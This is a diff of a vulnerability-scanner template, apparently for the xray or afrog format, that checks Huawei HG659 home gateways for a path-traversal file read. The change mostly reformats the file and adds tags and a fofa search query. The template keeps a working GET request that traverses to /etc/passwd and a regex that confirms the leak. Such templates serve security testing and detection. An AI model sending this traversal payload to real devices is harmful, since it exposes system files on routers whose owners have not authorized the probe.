@@ -1,19 +1,18 @@
 id: huawei-home-gateway-hg659-fileread
 
 info:
-    name: Huawei Home Gateway Hg659 Fileread
-    author: B1anda0(https://github.com/B1anda0)
-    severity: high
-    description: |
-        app="HUAWEI-Home-Gateway-HG659"
-    reference:
-        - http://wiki.peiqi.tech/wiki/iot/%E5%8D%8E%E4%B8%BA/Huawei%20HG659%20lib%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+  name: Huawei Home Gateway Hg659 Fileread
+  author: B1anda0
+  severity: high
+  description: |-
+    fofa: app="HUAWEI-Home-Gateway-HG659"
+  tags: huawei,hg659,fileread
+  created: 2025/08/20
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /lib///....//....//....//....//....//....//....//....//etc//passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: GET
+      path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
-
